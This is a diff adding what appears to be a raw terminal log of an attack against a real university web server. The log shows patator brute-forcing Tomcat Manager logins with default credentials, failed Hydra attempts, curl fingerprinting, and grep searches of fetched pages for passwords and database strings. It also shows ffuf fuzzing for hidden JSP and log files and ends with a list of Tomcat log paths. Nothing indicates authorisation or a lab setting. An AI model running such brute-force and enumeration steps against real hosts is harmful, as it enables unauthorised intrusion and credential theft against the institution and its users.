@@ -1,0 +1,98 @@
+18:32:09 patator    INFO - 401  2854:-1        0.063 | manager:ISCT_2010                  |   134 | HTTP/1.1 401 No Autorizado
+18:32:09 patator    INFO - 401  2854:-1        0.061 | manager:admin123                   |   142 | HTTP/1.1 401 No Autorizado
+18:32:09 patator    INFO - 401  2854:-1        0.062 | manager:123456                     |   144 | HTTP/1.1 401 No Autorizado
+18:32:09 patator    INFO - 401  2854:-1        0.063 | tomcat:Apache6                     |   152 | HTTP/1.1 401 No Autorizado
+18:32:09 patator    INFO - 401  2854:-1        0.063 | tomcat:admin123                    |   154 | HTTP/1.1 401 No Autorizado
+18:32:10 patator    INFO - Hits/Done/Skip/Fail/Size: 156/156/0/0/156, Avg: 25 r/s, Time: 0h 0m 6s
+
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
+[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module "http-get" instead.
+^X^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k "https://sito.utslp.edu.mx/default.jsp" > default_analysis.jsp
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1368    0  1368    0     0   4014      0 --:--:-- --:--:-- --:--:--  4011
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $grep -i -E "jdbc:|include|import|connection|database|password|user" default_analysis.jsp
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $grep -o 'include file="[^"]*"' default_analysis.jsp | cut -d'"' -f2
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -I "https://sito.utslp.edu.mx/manager/html"
+HTTP/1.1 401 No Autorizado
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Wed, 31 Dec 1969 18:00:00 CST
+WWW-Authenticate: Basic realm="Tomcat Manager Application"
+Content-Type: text/html
+Transfer-Encoding: chunked
+Date: Thu, 09 Oct 2025 00:34:30 GMT
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -v "https://sito.utslp.edu.mx/" 2>&1 | grep -i -E "server|x-powered-by|x-aspnet-version"
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* ALPN: server did not agree on a protocol. Uses default.
+* Server certificate:
+< Server: Apache-Coyote/1.1
+
+ :: URL              : https://sito.utslp.edu.mx/default.jsp?FUZZ=test
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 396 req/sec :: Duration: [0:00:26] :: Errors: 190 ::
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+ :: Method           : GET
+ :: URL              : https://sito.utslp.edu.mx/FUZZ.jsp
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .jsp 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [9228/9228] :: Job [1/1] :: 500 req/sec :: Duration: [0:00:22] :: Errors: 4053 ::
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+
+ :: URL              : https://sito.utslp.edu.mx/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .log .txt .out 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+                        [Status: 200, Size: 15938, Words: 1656, Lines: 541, Duration: 67ms]
+index.html              [Status: 200, Size: 634, Words: 55, Lines: 28, Duration: 61ms]
+:: Progress: [18456/18456] :: Job [1/1] :: 389 req/sec :: Duration: [0:00:41] :: Errors: 10241 ::
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $
+
+
+TOMCAT_LOGS.TXT
+logs/catalina.out
+logs/localhost.log
+logs/manager.log
+logs/host-manager.log
+
+
